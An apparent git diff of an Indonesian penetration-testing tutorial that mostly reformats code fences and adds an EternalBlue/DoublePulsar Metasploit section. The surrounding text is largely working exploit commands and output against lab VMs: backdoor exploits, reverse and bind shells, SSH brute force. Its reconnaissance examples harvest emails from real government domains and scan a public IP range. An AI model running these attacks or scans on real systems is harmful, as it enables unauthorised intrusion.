@@ -129,13 +129,13 @@ Information Gathering terbagi 2:
 
 Ping adalah perintah atau utilitas baris perintah yang digunakan untuk memeriksa koneksi jaringan antara dua perangkat yang terhubung melalui jaringan IP. Ping juga dapat diartikan sebagai pengukuran latensi, yaitu waktu yang dibutuhkan untuk mengirimkan dan menerima data dari perangkat ke server dan kembali lagi.
 
-```bash
+```
 ping google.com
 ```
 
 Terkadang output adalah IPv6 versi untuk menampilkan output ip address versi 4
 
-```bash
+```
 ping google.com -4
 ```
 
@@ -150,7 +150,7 @@ Nslookup adalah perintah atau perangkat lunak yang digunakan untuk mengambil inf
 * Mengidentifikasi masalah koneksi jaringan atau DNS 
 * Memeriksa apakah domain name resolution berhasil atau tidak
 
-```bash
+```
 nslookup dpr.go.id
 ```
 
@@ -163,7 +163,7 @@ Beberapa website Pasive Information Gathering seperti [https://ip-checker.info/]
 
 Whois adalah tools yang menyediakan informasi tentang domain, seperti: Nama domain, Nama server, Tanggal pembuatan, Tanggal kedaluwarsa, Informasi kontak pemilik domain
 
-```bash
+```
 whois google.com
 ```
 
@@ -171,19 +171,19 @@ whois google.com
 
 Melihat informasi suatu website, baik berupa plugin web yang digunakan plugin dll.:
 
-```bash
+```
 whatweb instagram.com -v
 ```
 
 Melakukan scan berdasarkan rentan IP address:
 
-```bash
+```
 whatweb 103.245.72.0-103.245.72.255 -v
 ```
 
 Melakukan scan dan menyimpan hasilnya ke dalam file:
 
-```bash
+```
 whatweb facebook.com -v --log-verbose=output.txt
 ```
 
@@ -191,19 +191,19 @@ whatweb facebook.com -v --log-verbose=output.txt
 
 theHarvester adalah tool untuk mencari alamat email berdasarkan domain yang berasal dari search engine yang disupport. Perintah untuk mencari email berdasarkan domain
 
-```bash
+```
 theHarvester -d untad.ac.id -b all 
 ```
 
 Mencari email dengan domain untad.ac.id, di yahoo
 
-```bash
+```
 theHarvester -d kejaksaan.go.id -b yahoo
 ```
 
 Mencari email dengan domain untad.ac.id, di yahoo dengan jumlah limit 10.
 
-```bash
+```
 theHarvester -d kejaksaan.go.id -b yahoo -l 10
 ```
 
@@ -217,31 +217,31 @@ Sharelock adalah tool yang digunakan untuk melacak akun media sosial dengan meng
 
 Download dan install [Sherlock](https://github.com/sherlock-project/sherlock).
 
-```bash
+```
 sherlock username
 ```
  
 mencari username lebih dari satu
 
-```bash
+```
 sherlock user1 user2 user3
 ```
 
 memasukan timeout pencarian setiap website, default 60 second, contoh kita masukan timeout 5 second.
 
-```bash
+```
 sherlock username --timeout 5
 ```
 
 menampilkan list website yang ditracking
 
-```bash
+```
 sherlock username --timeout 5 --print-all
 ```
 
 menyimpan output result ke dalam file
 
-```bash
+```
 sherlock username --timeout 5 --print-all --output output.txt
 ```
 
@@ -259,13 +259,13 @@ Kita membutuhkan vulnerability manchine untuk latihan sebagai target serangan, b
 
 Netdiscover merupakan tool untuk melakukan scan ipaddress dalam suatu network
 
-```bash
+```
 sudo netdiscover -r 192.168.1.0/24
 ```
 
 output
 
-```bash
+```
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                             
                                                                                                                                                                                                                                            
  6 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 540                                                                                                                                                                           
@@ -302,7 +302,7 @@ Nmap memiliki berbagai fitur, di antaranya:
 
 __Scanning ip__
 
-```bash
+```
 $ nmap -sn 192.168.1.0/24
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 20:45 +08
@@ -350,7 +350,7 @@ __Scanning port target__
 
 Melakukan port scanning target Metasploitable
 
-```bash
+```
 $ nmap 192.168.1.32
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 20:38 +08
@@ -388,13 +388,13 @@ Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds
 
 __Melakukan port scanning semua perangkat dalam LAN (ex. 192.168.1.0/24).__
 
-```bash
+```
 nmap 192.168.1.0/24
 ```
 
 __Scanning perangkat yang sedang aktif__
 
-```bash
+```
 nmap -sn 192.168.1.0/24
 
 tarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-11 15:56 +08
@@ -435,25 +435,25 @@ Nmap done: 256 IP addresses (11 hosts up) scanned in 46.26 seconds
 
 __Scan terhadap Microsoft Windows yang memblokir nmap__
 
-```bash
+```
 nmap -Pn 192.169.1.10
 ```
 
 __Scan berdasarkan ip range__
 
-```bash
+```
 nmap 192.168.1.0-255
 ```
 
 atau
 
-```bash
+```
 nmap 192.168.1.*
 ```
 
 __Scan dari list ip yang berada dalam file__
 
-```bash
+```
 $ cat list-ip.txt 
 192.168.1.22
 192.168.1.23
@@ -468,25 +468,25 @@ $ nmap -iL list-ip.txt
 
 __Sync Scan__
 
-```bash
+```
 sudo nmap -sS 192.168.1.22
 ```
 
 __TCP Scan__
 
-```bash
+```
 nmap -sT 192.168.1.22
 ```
 
 __UDP Scan__
 
-```bash
+```
 nmap -sU 192.168.1.22
 ```
 
 #### Scanning Sistem Operasi
 
-```bash
+```
 $ nmap -O 192.168.1.10
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-11 23:01 +08
@@ -509,7 +509,7 @@ No exact OS matches for host (test conditions non-ideal).
 
 #### Scanning Service Version
 
-```bash
+```
 $ nmap -sV 192.168.1.22
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-11 22:58 +08
@@ -549,7 +549,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.30 seconds
 
 Kita juga dapat mengatur intensitas dalam scanning service di nmap, adapun skala intensitasnya dari 1 - 9. Secara default intensitas yang di scan berada dalam skala 7, makin kecil scalanya makin cepat proses scannya. Berikut contoh menggunakan intersitas secara custom:
 
-```bash
+```
 nmap -sV --version-intensity 2 192.168.1.22
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-12 20:57 +08
@@ -589,13 +589,13 @@ Nmap done: 1 IP address (1 host up) scanned in 11.75 seconds
 
 Selain memberi angka kita juga bisa menggunakan perintah secara langsung, gunakan perintah berikut untuk intensitas rendah
 
-```bash
+```
 nmap -sV --version-light 192.168.1.22
 ```
 
 perintah berikut untuk intensitas tinggi
 
-```bash
+```
 nmap -sV --version-all 192.168.1.22
 ```
 
@@ -603,7 +603,7 @@ nmap -sV --version-all 192.168.1.22
 
 Kita dapat melakukan agresive scan dengan catatan scan akan lebih lama dan beresiko terdeksi jika mesin target terdapat detektor.
 
-```bash
+```
 $ nmap -A 192.168.1.22
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-12 21:45 +08
@@ -748,43 +748,43 @@ Nmap done: 1 IP address (1 host up) scanned in 33.09 seconds
 
 Contoh scan port  21
 
-```bash
+```
  nmap -sS -p 21 192.168.1.22
 ```
 
 Scan lebih dari satu port
 
-```bash
+```
 nmap -sS -p 21,22,80,100 192.168.1.22
 ```
 
 Scan port dengan rentang port tertentu
 
-```bash
+```
 nmap -sS -p 20-200 192.168.1.22
 ```
 
 Scan semua nomor port
 
-```bash
+```
 nmap -sS -p- 192.168.1.22
 ```
 
 Scan 100 port yang sering digunakan
 
-```bash
+```
 nmap -sS -F 192.168.1.22
 ```
 
 Simpan ke dalam file tanpa menampilkan output
 
-```bash
+```
 nmap -sS -F 192.168.1.22 >> scan-port.txt
 ```
 
 Simpan ke dalam file dengan menampilkan output
 
-```bash
+```
 nmap -sS -F -oN output-port.txt 192.168.1.22
 ```
 
@@ -799,7 +799,7 @@ Vulnerability Analysis adalah proses melakukan analisis kerentanan suatu sistem.
 
 Untuk melakukan vurnerability scan dengan nmap kita akan menggunakan nmap script script yang berada di `usr/share/nmap/scripts`:
 
-```bash
+```
 $ cd usr/share/nmap/scripts
 ```
 
@@ -809,13 +809,13 @@ File script semua berformat *.nse (nmap single script), selain itu ada juga yang
 
 Script nmap ada di dalam `usr/share/nmap/scripts`.
 
-```bash
+```
 $ cd usr/share/nmap/scripts
 ```
 
 Kita akan menggunakan script `ftp-anon.nse` untuk melakukan scanning anonymous login
 
-```bash
+```
 $ nmap --script ftp-anon.nse 192.168.1.22 -sS 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-14 13:07 +08
 Nmap scan report for 192.168.1.22 (192.168.1.22)
@@ -853,7 +853,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
 
 Hasil `Anonymous FTP login allowed`, login secara anonym diijinkan
 
-```bash
+```
 $ ftp 192.168.1.22
 
 Connected to 192.168.1.22.
@@ -871,7 +871,7 @@ __Help__
 
 Jika kita ingin mengetahui keterangan dari script nmap kita bisa menggunakan perintah (contoh: `http-wordpress-enum.nse`):
 
-```bash
+```
 nmap --script-help http-wordpress-enum.nse 
 ```
 
@@ -879,7 +879,7 @@ nmap --script-help http-wordpress-enum.nse
 
  Group script yang bisa dilihat di [https://nmap.org/book/nse-usage.html](https://nmap.org/book/nse-usage.html). Kita akan melakukan scanning kategori `auth` menggunakan script group dengan sync scan.
 
-```bash
+```
 $ nmap --script auth 192.168.1.22 -sS
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-14 10:59 +08
@@ -949,7 +949,7 @@ Kita akan mencoba membuka browser untuk menguji server tomcat buka `192.168.1.22
 
 Selanjutnya kita akan mencoba mencoba sript group `malware` untuk mengetahui target terinfeksi malware atau backdoor.
 
-```bash
+```
 $ sudo nmap --script malware 192.168.1.22 -sS
 
 [sudo] password for ucup: 
@@ -1006,7 +1006,7 @@ Dari hasil yang ada, ditemukan vulnerable atau terinfeksi malware/backdoor `ftp-
 
 Kita juga dapat mencari versi service melalui group script `banner`:
 
-```bash
+```
 $ sudo nmap --script banner 192.168.1.22 -sS
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-14 12:53 +08
@@ -1058,7 +1058,7 @@ Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds
 
 Dari hasil di atas kita menemukan versi vsftp 2.3.4, dan kita bisa mencari exploit yang bisa kita gunakan dengan perintah:
 
-```bash
+```
 $ searchsploit vsFTPd 2.3.4
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -1080,7 +1080,7 @@ Cara install nessus bisa dilihat [disini](https://www.youtube.com/watch?v=k5vUaH
 
 Setelah terinstall kita perlu menjalankan service nessus
 
-```bash
+```
 sudo /bin/systemctl start nessusd.service
 ```
 
@@ -1101,7 +1101,7 @@ Untuk module metasploit berada di direktori `modules`
 
 Scan target:
 
-```bash
+```
 $ nmap -sS -sV 192.168.1.22
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-14 22:42 +08
@@ -1141,7 +1141,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.66 seconds
 
 Dari hasil scan ditemukan port 21 terbuka untuk service ftp `vsftpd 2.3.4`. Kita cari exploitnya:
 
-```bash
+```
 $ searchsploit vsftpd 2.3.4         
 
 ----------------------------------------------------------------------- ---------------------------------
@@ -1155,7 +1155,7 @@ Shellcodes: No Results
 
 Dari hasil di atas ditemukan 2 exploit yaitu `unix/remote/49757.py` dan `unix/remote/17491.rb` yang berasal dari Metasploit. Masuk kedalam `msconsole`
 
-```bash
+```
 $ sudo msfconsole 
 
 [sudo] password for ucup: 
@@ -1217,7 +1217,7 @@ msf6 >
 
 Mencari exploit vsftpd 2.3.4
 
-```bash
+```
 msf6 > search vsftpd 2.3.4
 
 Matching Modules
@@ -1234,7 +1234,7 @@ Interact with a module by name or index. For example info 0, use 0 or use exploi
 Menggunakan exploit bisa dengan perintah `use exploit/unix/ftp/vsftpd_234_backdoor` atau `use 0`.
 
 
-```bash
+```
 msf6 > use 0
 
 [*] No payload configured, defaulting to cmd/unix/interact
@@ -1243,7 +1243,7 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
 
 Melihat informasi ketik `show info`:
 
-```bash
+```
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show info
 
        Name: VSFTPD v2.3.4 Backdoor Command Execution
@@ -1296,14 +1296,14 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
 
 Dari data yang muncul ip address host target pada bagian `RHOSTS` masih kosong. Kita masukan data ip address target dengan perintah `set RHOSTS xxx.xxx.xxx.xxx`
 
-```bash
+```
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.22
 RHOSTS => 192.168.1.22
 ```
 
 cek options untuk melihat konfigurasi jalankan `show options`
 
-```bash
+```
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
 
 Module options (exploit/unix/ftp/vsftpd_234_backdoor):
@@ -1327,7 +1327,7 @@ View the full module info with the info, or info -d command.
 
 Untuk mulai exploit jalankan perintah `exploit` atau `run`.
 
-```bash
+```
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 
 [*] 192.168.1.22:21 - Banner: 220 (vsFTPd 2.3.4)
@@ -1340,7 +1340,7 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 
 Bannggg!!!! kita sudah berada dalam shell target untuk mengujinya ketik `ifconfig` untuk mengetahui ip addressnya.
 
-```bash
+```
 ifconfig
 
 eth0      Link encap:Ethernet  HWaddr 08:00:27:27:b4:9c  
@@ -1370,7 +1370,7 @@ Untuk keluar ketik `exit` atau `quit`.
 
 Exploit telnet pada metasploitable tidaklah sulit karena secara default kita tidak perlu menggunakan metasploit framework.
 
-```bash
+```
 $ nmap -sV 192.168.1.22
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-15 21:27 +08
@@ -1410,7 +1410,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.99 seconds
 
 Dari hasil di atas port ternet terbuka pada port `23/tcp`, kita bisa langsung masuk ke dalam system target metasploitable melalui telnet dengan user dan password `msfadmin` dengan perintah:
 
-```bash
+```
 $ telnet 192.168.1.22  
 
 Trying 192.168.1.22...
@@ -1452,7 +1452,7 @@ No mail.
 
 Scan versi service
 
-```bash
+```
 $ nmap -sV 192.168.1.22
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-15 21:27 +08
@@ -1492,7 +1492,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.99 seconds
 
 Dari output di atas kita menemukan port samba yang terbuka, cuma masalahnya versi samba tidak jelas. Kita bisa saja menggunakan perintah `searchsploit samba`
 
-```bash
+```
 $ searchsploit samba
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -1577,7 +1577,7 @@ Cuman masalah lain muncul yaitu versi yang muncul banyak karena kita tidak memas
 
 Metasploit mempunyai modules `auxiliary` pada direktori modules, yang di dalamnya terdapat direktori `scanner` yang bisa kita gunakan.
 
-```bash
+```
 $ cd /usr/share/metasploit-framework/modules/auxiliary/scanner
 
 $ ls
@@ -1590,7 +1590,7 @@ backdoor  dcerpc   dns        ftp     http    ipmi  ldap      memcached  mqtt   
 
 Di dalam `scanner` kita tinggal memilih untuk menggunakan modules yang akan kita gunakan, dalam kasus ini kita akan menggunakan modules `smb` untuk mencari versi samba yang kita cari.
 
-```bash
+```
 $ cd /usr/share/metasploit-framework/modules/auxiliary/scanner/smb
 
 $ ls
@@ -1600,7 +1600,7 @@ pipe_auditor.rb  psexec_loggedin_users.rb  smb_enumshares.rb  smb_enumusers_doma
 
 Dalam direktori `smb` terdapat file `smb_version.rb` yangf bisa kita gunakan untuk mencari versi samba. Selanjutnya kita akan menggunakan metasploit untuk mencari/scannning versi samba.
 
-```bash
+```
 $ msfconsole  
 
 Metasploit tip: Use the edit command to open the currently active module 
@@ -1642,7 +1642,7 @@ msf6 >
 
 Kita sudah mengetahui lokasi file samba scanner yang berada dalam `auxiliary/scanner/smb/`
 
-```bash
+```
 msf6 > use auxiliary/scanner/smb/
 
 Matching Modules
@@ -1679,7 +1679,7 @@ msf6 auxiliary(scanner/smb/smb_version) >
 
 Kita sudah masuk kedalam mode msfconsole untuk mencari versi samba. Selanjutnya kita perlu melakukan konfigurasi tambahan sebelum di `run` yaitu memasukan ip address target.
 
-```bash
+```
 msf6 auxiliary(scanner/smb/smb_version) > show info
 
        Name: SMB Version Detection
@@ -1741,7 +1741,7 @@ Banggggg!!!! kita sudah menemukan versi samba yaitu `Samba 3.0.20`.
 
 Setelah versi samba diketahui kemudian kita akan mencari exploit samba:
 
-```bash
+```
 $ searchsploit samba 3.0.20
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -1759,7 +1759,7 @@ Ok... dari hasil pencarian kita menemukan exploit `Samba 3.0.20 < 3.0.25rc3 - 'U
 
 Selanjutnya kita masuk ke dalam metasploit lagi, dan menggunakan exploit yang sudah kita temukan.
 
-```bash
+```
 $ msfconsole
 
 Metasploit tip: To save all commands executed since start up to a file, use the 
@@ -1906,7 +1906,7 @@ View the full module info with the info, or info -d command.
 
 Pada bagian `LHOST  192.168.1.21`, ip address tersebut adalah ip address Kali Linux kita. Kemudian kita tinggal menjalankan `run` atau `exploit`
 
-```bash
+```
 msf6 exploit(multi/samba/usermap_script) > exploit
 
 [*] Started reverse TCP handler on 192.168.1.21:4444 
@@ -1921,12 +1921,12 @@ Dalam dunia nyata, yang perlu disiapkan sebelum adalah brutoforce adalah wordlis
 
 Membuat wordlist minimal 6 karakter maksimal 8 karakter dan disimpan dalam `user-list.txt` file.
 
-```bash
+```
 crunch 6 8 -o user-list.txt
 ```
 Contoh menambahkan spesifik karakter yang akan dibuat dalam wordlist
 
-```bash
+```
 crunch 8 8 msifadn -o user-list.txt
 ```
 
@@ -1934,7 +1934,7 @@ Module yang akan kita gunakan untuk bruto force ssh adalah `ssh_login.rb`yang  b
 
 Jalankan metasploit sekaligus memasukan option konfigurasi:
 
-```bash
+```
 $ msfconsole 
 
 Metasploit tip: The use command supports fuzzy searching to try and 
@@ -2042,7 +2042,7 @@ msf6 auxiliary(scanner/ssh/ssh_login) > run
 
 Dari output diatas ketika metasploit mendapatkan username dan password ssh, metasploit akan membuka session baru, kita bisa melihat session yang terbuka dan bisa langsung digunakan.
 
-```bash
+```
 msf6 auxiliary(scanner/ssh/ssh_login) > sessions
 
 Active sessions
@@ -2067,7 +2067,7 @@ Jika kita kembali pada hasil scan nessus sebelumnya, terdapat vurnerability pada
 
 Dalam keterangan gambar di atas nessus berhasil menemukan vurnerability dari password VNC Server yaitu `password` pada port `5900`. Dengan data tersebut kita bisa langsung masuk ke dalam vnc server Metasploitable target.
 
-```bash
+```
 vncviewer 192.168.1.22
 ```
 
@@ -2083,7 +2083,7 @@ Pada hasil lain nessus vurnerability analysis terdapat vurnerability pada bind s
 
 Pada keterangan gambar di atas, terdapat shell yang sedang menunggu remote tanpa adanya authentication. Kita dapat menggunakan tools `netcat` pada Kali Linux untuk terhubung dengan target.
 
-```bash
+```
 $ netcat 192.168.1.22 1524
 
 root@metasploitable:/# 
@@ -2094,7 +2094,7 @@ Bangggg!!!!!
 
 IRC adalah Internet Relay Chat, yang merupakan jaringan server internet yang memungkinkan pengguna untuk melakukan percakapan teks secara real-time. Dari hasil scan nmap ditemukan port terbukan pada `6667/tcp open  irc  UnrealIRCd`.
 
-```bash
+```
 $ nmap -sV 192.168.1.22              
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 21:32 +08
@@ -2134,7 +2134,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds
 
 Pencarian exploit `UnrealIRCd`
 
-```bash
+```
 $ searchsploit unrealircd
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                                                                  |  Path
@@ -2149,7 +2149,7 @@ Shellcodes: No Results
 
 Kita menemukan exploit `UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit) linux/remote/16922.rb` yang dimiliki oleh metasploit, untuk itu kita akan masuk ke dalam metasploit.
 
-```bash
+```
 $ msfconsole
 
 Metasploit tip: Network adapter names can be used for IP options set LHOST 
@@ -2230,7 +2230,7 @@ msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
 
 Dari hasil di atas kita perlu memasukan `payload`, dan karena menggunakan payload kita perlu memasukan juga `LHOST` yaitu ip Kali Linux kita:
 
-```bash
+```
 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads
 
 Compatible Payloads
@@ -2283,7 +2283,7 @@ Banggggg!!!!!
 
 Selanjutnya kita akan mencoba exploit java rmi, buka console metasploit:
 
-```bash
+```
 $ msfconsole
 
 Metasploit tip: Search can apply complex filters such as search cve:2009 
@@ -2431,7 +2431,7 @@ Bangggg!!!! kita berhasil exploit java rmi tapi ada yang berbeda kali ini kita m
 
 Scan port 80 pada target
 
-```bash
+```
 nmap -sV 192.168.1.22      
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 20:07 +08
 Nmap scan report for 192.168.1.22 (192.168.1.22)
@@ -2470,7 +2470,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.82 seconds
 
 Port 80 target terbuka selanjutnya masuk ke dalam metasploit, hal yang perlu dilakukan pertama menggunakan exploit untuk mengecek versi php kemudian menggunakan `search http_version` untuk mencari exploit, kemudian mencari exploit `php cgi` dengan perintah `search php_cgi`.
 
-```bash
+```
 $ msfconsole
 
 Metasploit tip: Use the analyze command to suggest runnable modules for 
@@ -2670,7 +2670,7 @@ __Step 2__
 
 Scan target
 
-```bash
+```
 $ nmap -p- -A -T4 192.168.1.5
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 21:45 +08
@@ -2729,7 +2729,7 @@ __Step 3__
 
 Buka `msfconsole` dan search eternalblue.
 
-```bash
+```
 $ msfconsole
 
 Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it 
@@ -2807,7 +2807,7 @@ msf6 >
 
 Dari hasil di atas terdapat banyak exploit dari eternalblue, kita bisa mencoba `24  auxiliary/scanner/smb/smb_ms17_010` untuk mencari vurnerability target windows.
 
-```bash
+```
 msf6 > use 24
 msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
 
@@ -2849,7 +2849,7 @@ Dari hasil di atas ditemukan `Host is likely VULNERABLE` yang berarti kemungkina
 
 Kita bisa mencari lagi eternalblue dan menggunakan exploit `0   exploit/windows/smb/ms17_010_eternalblue`:
 
-```bash
+```
 msf6 auxiliary(scanner/smb/smb_ms17_010) > search eternalblue
 
 Matching Modules
@@ -2985,7 +2985,7 @@ Proses exploit Windows XP hampir sama dengan Windows 7 sebelumnya (pastikan suda
 
 Scan:
 
-```bash
+```
 $ nmap -p- -A -T4 192.168.1.6
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 21:43 +08
@@ -3031,7 +3031,7 @@ Nmap done: 1 IP address (1 host up) scanned in 41.82 seconds
 
 Exploit dengan metasploit framework
 
-```bash
+```
 $ msfconsole
 
 Metasploit tip: Use the resource command to run commands from a file
@@ -3225,3 +3225,199 @@ Meterpreter     : x86/windows
 Bangg!!! berhasil.
 
 >Baca Juga: [Meterpreter Basics Command](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)
+
+#### Exploit Windows 7 dengan Doublepulsar
+
+DoublePulsar adalah tool backdoor yang dikembangkan oleh Equation Group milik Badan Keamanan Nasional Amerika Serikat (NSA), yang dibocorkan oleh The Shadow Brokers pada awal tahun 2017. Cara kerja Doublepulsar yaitu dengan menyerang vulnerability Remote Code Execution (RCE) melalui SMB Protocol.
+
+Doublepulsar juga dapat mengexploit Windows 7 dan Windows 10.
+
+Tool yang dibutuhkan:
+
+* Wine (untuk mnenjalankan file *.exe)
+* Download Doublepulsar (Tidak terdapat dalam Kali Linux)
+
+1. Install Wine
+
+```
+sudo dpkg --add-architecture i386 && sudo apt-get update && sudo apt-get install wine32
+```
+
+> __Note__: Setelah instalasi wine kita perlu membuat direktori konfigurasi `.wine`, jadi untuk membuatnya lakukan instalasi aplikasi windows yang berekstensi `*.exe` atau `*.msi` dalam mode root.
+
+2. Install DoublePulsar
+
+Kita akan mendownload Doublepulsar dan menginstallnya ke dalam Metasploit framework
+
+```
+git clone https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit.git   
+sudo cp Eternalblue-Doublepulsar-Metasploit /root/ -r
+sudo su
+cd /root
+cp deps /usr/share/metasploit-framework/modules/exploits/windows/smb -r 
+cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
+```
+
+Masuk ke dalam Metasploit console
+
+```
+$ sudo msfconsole
+[sudo] password for ucup: 
+
+Metasploit tip: You can pivot connections over sessions started with the 
+ssh_login modules
+                                                  
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+       =[ metasploit v6.4.38-dev                          ]
++ -- --=[ 2468 exploits - 1273 auxiliary - 431 post       ]
++ -- --=[ 1478 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > use exploit/windows/smb/eternalblue_doublepulsar 
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/eternalblue_doublepulsar) > show info
+
+       Name: EternalBlue
+     Module: exploit/windows/smb/eternalblue_doublepulsar
+   Platform: Windows
+       Arch: x86, x64
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  Pablo Gonzalez ( <Pablo Gonzalez (@pablogonzalezpe)>
+  Sheila A. Berta ( <Sheila A. Berta (@UnaPibaGeek)>
+
+Available targets:
+      Id  Name
+      --  ----
+      0   Windows XP (all services pack) (x86) (x64)
+      1   Windows Server 2003 SP0 (x86)
+      2   Windows Server 2003 SP1/SP2 (x86)
+      3   Windows Server 2003 (x64)
+      4   Windows Vista (x86)
+      5   Windows Vista (x64)
+      6   Windows Server 2008 (x86)
+      7   Windows Server 2008 R2 (x86) (x64)
+  =>  8   Windows 7 (all services pack) (x86) (x64)
+
+Check supported:
+  No
+
+Basic options:
+  Name                Current Setting                                  Required  Description
+  ----                ---------------                                  --------  -----------
+  DOUBLEPULSARPATH    /root/Eternalblue-Doublepulsar-Metasploit/deps/  yes       Path directory of Doublepulsar
+  ETERNALBLUEPATH     /root/Eternalblue-Doublepulsar-Metasploit/deps/  yes       Path directory of Eternalblue
+  PROCESSINJECT       wlms.exe                                         yes       Name of process to inject into (Change to lsass.exe for x64)
+  RHOSTS                                                               yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT               445                                              yes       The SMB service port (TCP)
+  TARGETARCHITECTURE  x86                                              yes       Target Architecture (Accepted: x86, x64)
+  WINEPATH            /root/.wine/drive_c/                             yes       WINE drive_c path
+
+Payload information:
+  Avoid: 3 characters
+
+Description:
+  This module exploits a vulnerability on SMBv1/SMBv2 protocols through Eternalblue. 
+  After that, doublepulsar is used to inject remotely a malicious dll (it's will generate based on your           payload selection).
+  You can use this module to compromise a host remotely (among the targets available) without needing             nor authentication neither target's user interaction.
+  ** THIS IS AN INTEGRATION OF THE ORIGINAL EXPLOIT, IT'S NOT THE FULL PORTATION **
+
+
+View the full module info with the info -d command.
+
+msf6 exploit(windows/smb/eternalblue_doublepulsar) > show options
+
+Module options (exploit/windows/smb/eternalblue_doublepulsar):
+
+   Name                Current Setting                                  Required  Description
+   ----                ---------------                                  --------  -----------
+   DOUBLEPULSARPATH    /root/Eternalblue-Doublepulsar-Metasploit/deps/  yes       Path directory of Doublepulsar
+   ETERNALBLUEPATH     /root/Eternalblue-Doublepulsar-Metasploit/deps/  yes       Path directory of Eternalblue
+   PROCESSINJECT       wlms.exe                                         yes       Name of process to inject into (Change to lsass.exe for x64)
